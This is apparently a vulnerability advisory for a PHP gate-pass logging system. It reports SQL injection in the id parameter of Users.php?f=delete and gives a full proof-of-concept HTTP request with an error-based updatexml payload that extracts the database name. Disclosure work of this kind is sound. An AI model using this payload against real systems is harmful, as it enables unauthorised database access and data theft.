## Affected version: 
Employee and Visitor Gate Pass Logging System - 1.0

## Vendor:
https://www.sourcecodester.com/users/tips23

## Software:
https://www.sourcecodester.com/php/15026/employee-and-visitor-gate-pass-logging-system-php-source-code.html

## Vulnerability File:
/employee_gatepass/classes/Users.php?f=delete

## Description:
Employee and Visitor Gate Pass Logging System 1.0 is vulnerable to unrestricted SQL injection attacks via /employee_gatepass/classes/Users.php, the controllable parameter is: id. This function brings the id parameter into the SQL statement for execution without any restrictions. A malicious attacker could exploit this vulnerability to obtain sensitive information in the server database.

Status: CRITICAL

POC
```
POST /employee_gatepass/classes/Users.php?f=delete HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 55
Origin: http://localhost
Connection: close
Referer: http://localhost/employee_gatepass/admin/?page=user/list
Cookie: PHPSESSID=q643apn08ggv5g81r5q8pocl6t
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Forwarded-For: 192.168.1.23

id=11' and updatexml(1,concat(0x7e,(database())),3)-- q
```
![image](https://github.com/Hefei-Coffee/cve/assets/168982375/d7c84b54-5022-400a-8b8c-79ae1e8035a4)

## code analysis:

The id parameter in Users.php is controllable and directly brought into the SQL statement for execution, causing SQL injection.

![image](https://github.com/Hefei-Coffee/cve/assets/168982375/8c34f811-da99-4eac-902f-97098c7eeb6e)


